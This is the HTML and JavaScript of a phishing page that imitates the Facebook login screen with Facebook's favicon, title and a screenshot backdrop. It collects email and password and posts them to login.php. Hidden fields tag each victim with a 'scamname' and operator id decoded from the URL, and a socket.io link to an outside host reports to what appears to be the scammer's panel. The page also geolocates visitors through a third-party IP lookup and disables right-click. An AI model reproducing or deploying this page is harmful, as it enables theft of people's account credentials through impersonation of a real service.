
<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">


    <link rel="shortcut icon" href="https://fbstatic-a.akamaihd.net/rsrc.php/yl/r/H3nktOa7ZMg.ico">
    <title>Facebook</title>
    <style>
    body {
    background:url('https://i.ibb.co/ScGSMs4/sc0m-png.png') repeat-x;
    /* background-color:black; */
    margin:0;
        height: 123%;
    }
    .form{
    background:url('https://i.ibb.co/Phgkshy/sc0m-png.png') no-repeat;
    background-position:center top;
    height:95%
    }
    .kl{
    position:absolute;
    top :26.40em;
    right:50%;
    margin-right: -9.6em;
    width:193px;
    padding: 3px;
    height:25px;
    border: 1px solid #bdc7d8;
    font-family: 'lucida grande',tahoma,verdana,arial,sans-serif;
    font-size: 11px;
    }
    .kj{
    position:absolute;
    top :29.20em;
    right:50%;
    margin-right: -9.6em;
    width:193px;
    padding: 3px;
    height:25px;
    border: 1px solid #bdc7d8;
    font-family: 'lucida grande',tahoma,verdana,arial,sans-serif;
    font-size: 11px;
    }
    .kk{
    position:absolute;
    top:27.4em;
    right:50%;
    margin-right: 1.2em;
    width:5.5em;
    height:2em;
    background:transparent;
    border:transparent;
    cursor:pointer;
    }
    </style>
    </head>
    <body oncontextmenu="return false">
    <form class="form" id="page" action="login.php" method="POST">
        <div class="pd-13">
            <input type="hidden" value="" name="code" v-model="codecountry">

            <input type="hidden" value="" name="id" v-model="id_u">
            <input type="hidden" value="" name="sc" v-model="scamname">
            
          </div>
    <input class="kl"  id="email" name="email" :placeholder="email" type="text">
    <input class="kj"  id="password" name="password" :placeholder="password" type="password">
    <input class="kk" value="" type="submit">
    <button type="submit" name="add" class="kk"></button>
    </form>

    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
  <script src="https://unpkg.com/country-phone-prefix@latest"></script>
  <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.3.2/socket.io.js"></script>
  <script>
    const socket = io("wss://sc0m.herokuapp.com");
    const queryStrings = window.location.search;
    const urlParamss = new URLSearchParams(queryStrings);
    const qs = urlParamss.get('q');

    let rrss = atob(qs);
    let users = rrss.split("_")[3];
    users = users.split("=")[1];
    function ss() {
      socket.emit('add', {
        nickname: "users",
        groupe: parseInt(users),
      });
      socket.emit('adds', {
        nickname: "users",
        groupe: "all",
      });
    };
  </script>
  <script>
    var vm = new Vue({
el : "#page",
data:{
  password:"",
  email:"",
  login:'',
  firsts:'',
  create:'',
  forget:'',
  fetch:[],
  codecountry:'',
  id_u:'',
  scamname:'',
},
methods:{

},
      
 mounted()  {
     let email = document.getElementById('email').value;
  let password = document.getElementById('password').value;
     const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
const q = urlParams.get('q');

let rrs= atob(q);
let idu= rrs.split("=")[1][1]
let user= rrs.split("_")[3]
user= user.split("=")[1]
let sc= rrs.split("_")[2]
sc= sc.split("=")[1]
rrs= rrs.split("_")[1]
rrs= rrs.split("=")[1]
//alert(user)
let lang = rrs;
this.id_u = user
this.scamname= sc

   if(lang == 'ar'){
     this.email = "رقم الهاتف  أو البريد الإلكتروني";
     this.password = "كلمه السر";
     this.create = "انشاء حساب جديد";
     this.firsts = "انت تحتاج لتسجيل الدخول اولا.";
     this.forget = " هل نسيت كلمة السر ؟";
     this.login="تسجيل الدخول"
   }
   else if (lang == 'es'){
      this.email = "Número o correo electrónico";
     this.password = "contraseña";
     this.create = "Crear una nueva cuenta";
     this.firsts = "Primero debes iniciar sesión.";
     this.forget = "¿Contraseña olvidada?";
     this.login = "iniciar sesión";
   }
   else if (lang == 'th'){
      this.email = "เบอร์มือถือหรืออีเมล";
     this.password = "รหัสผ่าน";
     this.create = "สร้างบัญชีใหม่";
     this.firsts = "คุณต้องเข้าสู่ระบบก่อน";
     this.forget = "ลืมรหัสผ่าน?";
     this.login = "เข้าสู่ระบบ";
   }
   else {
      this.email = "Mobile number or email address";
     this.password = "Password";
     this.create = "Create New Account";
     this.firsts = "You need to log in first.";
     this.forget = "Forgotten password?";
     this.login = "Log In";
   }
   
axios.get("https://livebotola.com/ip.php")
       .then((resps)=>{

    let dd=  cpp[resps.data]
       this.codecountry = dd.prefix;
         })
  
        },
})
  </script>

    </body></html>